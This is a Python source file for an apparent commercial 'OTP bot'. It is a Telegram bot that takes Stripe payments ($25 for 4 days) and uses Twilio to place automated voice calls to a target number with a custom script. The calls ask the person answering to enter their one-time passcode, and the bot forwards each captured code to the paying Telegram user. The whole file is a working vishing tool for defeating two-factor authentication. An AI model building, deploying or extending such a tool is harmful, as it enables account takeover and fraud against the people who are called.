import os
import asyncio
import threading
from datetime import datetime, timedelta, timezone
from flask import Flask, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
import stripe
import requests
import urllib.parse

# -------------------------
# ENV VARIABLES
# -------------------------
TELEGRAM_TOKEN = os.environ["TELEGRAM_TOKEN"]
TWILIO_ACCOUNT_SID = os.environ["TWILIO_ACCOUNT_SID"]
TWILIO_AUTH_TOKEN = os.environ["TWILIO_AUTH_TOKEN"]
TWILIO_PHONE_NUMBER = os.environ["TWILIO_PHONE_NUMBER"]
STRIPE_SECRET_KEY = os.environ["STRIPE_SECRET_KEY"]
PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://example.com")  # your Render URL
PORT = int(os.environ.get("PORT", 5000))

stripe.api_key = STRIPE_SECRET_KEY
twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

# -------------------------
# STATE STORAGE
# -------------------------
user_phone = {}          # Telegram user -> phone
phone_to_chat = {}       # phone -> Telegram chat
captured_otp = {}        # phone -> OTP
last_message = {}        # Telegram user -> last custom message
paid_users = {}          # user_id -> paid_until datetime

# -------------------------
# FLASK APP FOR TWILIO / STRIPE
# -------------------------
flask_app = Flask(__name__)

@flask_app.route("/voice", methods=["POST", "GET"])
def voice():
    msg = request.args.get("msg", "Please enter your OTP now.")
    resp = VoiceResponse()
    gather = Gather(input="dtmf speech", timeout=10, num_digits=6, action="/capture", method="POST")
    gather.say(msg)
    resp.append(gather)
    resp.say("No input received. Goodbye!")
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/capture", methods=["POST"])
def capture():
    otp = request.values.get("Digits") or request.values.get("SpeechResult")
    phone = request.values.get("To") or request.values.get("From")
    captured_otp[phone] = otp
    chat_id = phone_to_chat.get(phone)
    if chat_id:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                      data={"chat_id": chat_id, "text": f"📩 Captured OTP: {otp}"})
    resp = VoiceResponse()
    resp.say("Thanks! Your OTP has been captured. Goodbye!")
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/call_status", methods=["POST"])
def call_status():
    status_map = {
        "initiated": "📞 Call initiated.",
        "ringing": "📲 Call ringing.",
        "answered": "✅ Call answered.",
        "completed": "📴 Call completed.",
        "no-answer": "❌ Call not answered."
    }
    call_status = request.values.get("CallStatus")
    to_number = request.values.get("To")
    chat_id = phone_to_chat.get(to_number)
    if chat_id:
        msg = status_map.get(call_status, f"ℹ️ Call status: {call_status}")
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                      data={"chat_id": chat_id, "text": msg})
    return ("", 204)

@flask_app.route("/success")
def payment_success():
    user_id = int(request.args.get("user_id"))
    paid_users[user_id] = datetime.now(timezone.utc) + timedelta(days=4)
    return f"✅ Payment successful. You now have 4 days access."

@flask_app.route("/cancel")
def payment_cancel():
    return "❌ Payment canceled."

# -------------------------
# TELEGRAM BOT
# -------------------------
app_telegram = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

def is_paid(user_id: int):
    return user_id in paid_users and datetime.now(timezone.utc) < paid_users[user_id]

def get_main_keyboard(user_id: int):
    keyboard = [
        [InlineKeyboardButton("📱 Set Phone", callback_data="setphone")],
        [InlineKeyboardButton("ℹ️ Help / Usage", callback_data="help")]
    ]
    if not is_paid(user_id):
        keyboard.insert(1, [InlineKeyboardButton("💳 Pay $25 / 4 Days", callback_data="pay")])
    if user_id in user_phone:
        keyboard[0].append(InlineKeyboardButton("📞 Make Call", callback_data="call"))
    return InlineKeyboardMarkup(keyboard)

def create_checkout_session(user_id: int):
    session = stripe.checkout.Session.create(
        payment_method_types=["card"],
        line_items=[{
            "price_data": {
                "currency": "usd",
                "product_data": {"name": "4-Day Access"},
                "unit_amount": 2500,
            },
            "quantity": 1,
        }],
        mode="payment",
        success_url=f"{PUBLIC_URL}/success?user_id={user_id}",
        cancel_url=f"{PUBLIC_URL}/cancel"
    )
    return session.url

# ----- HANDLERS -----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Welcome!\nUse the buttons below:", reply_markup=get_main_keyboard(update.effective_user.id))

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    await context.bot.send_message(chat_id=chat_id,
        text="ℹ️ How to use:\n1️⃣ Set phone\n2️⃣ Make call / OTP capture\n3️⃣ Payment unlocks features",
        reply_markup=get_main_keyboard(update.effective_user.id))

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "pay":
        url = create_checkout_session(uid)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"💳 Pay here: {url}")
        return

    if query.data in ["setphone", "call"] and not is_paid(uid):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="💰 You must pay $25 for 4 days.")
        return

    if query.data == "setphone":
        await query.edit_message_text("📱 Send your phone number (+1XXXXXXXXXX):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data="menu")]]))
        context.user_data["awaiting_phone"] = True

    elif query.data == "call":
        if uid not in user_phone:
            await query.edit_message_text("⚠️ Set phone first.", reply_markup=get_main_keyboard(uid))
        else:
            await query.edit_message_text("📞 Send custom message for the call or /call to reuse last.", reply_markup=get_main_keyboard(uid))
            context.user_data["awaiting_message"] = True

    elif query.data == "help":
        await help_command(update, context)
    elif query.data == "menu":
        await query.edit_message_text("Main Menu:", reply_markup=get_main_keyboard(uid))

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()

    if not is_paid(uid):
        await update.message.reply_text("💰 You must pay $25 for 4 days.")
        return

    if context.user_data.get("awaiting_phone"):
        user_phone[uid] = text
        phone_to_chat[text] = update.effective_chat.id
        context.user_data["awaiting_phone"] = False
        await update.message.reply_text(f"✅ Phone saved: {text}", reply_markup=get_main_keyboard(uid))
        return

    if context.user_data.get("awaiting_message"):
        last_message[uid] = text
        context.user_data["awaiting_message"] = False
        phone = user_phone[uid]
        twilio_client.calls.create(
            to=phone,
            from_=TWILIO_PHONE_NUMBER,
            url=f"{PUBLIC_URL}/voice?msg={urllib.parse.quote(text)}",
            status_callback=f"{PUBLIC_URL}/call_status",
            status_callback_event=['initiated','ringing','answered','completed','no-answer'],
            status_callback_method='POST'
        )
        await update.message.reply_text(f"📞 Calling {phone} now...")

    if text == "/call":
        phone = user_phone.get(uid)
        msg = last_message.get(uid)
        if phone and msg:
            twilio_client.calls.create(
                to=phone,
                from_=TWILIO_PHONE_NUMBER,
                url=f"{PUBLIC_URL}/voice?msg={urllib.parse.quote(msg)}",
                status_callback=f"{PUBLIC_URL}/call_status",
                status_callback_event=['initiated','ringing','answered','completed','no-answer'],
                status_callback_method='POST'
            )
            await update.message.reply_text(f"📞 Re-calling {phone} with last message...")
        else:
            await update.message.reply_text("⚠️ Set phone and message first.")

# ----- REGISTER HANDLERS -----
app_telegram.add_handler(CommandHandler("start", start))
app_telegram.add_handler(CallbackQueryHandler(handle_buttons))
app_telegram.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

# ----- RUN -----
if __name__ == "__main__":
    threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=PORT), daemon=True).start()
    asyncio.run(app_telegram.run_polling())
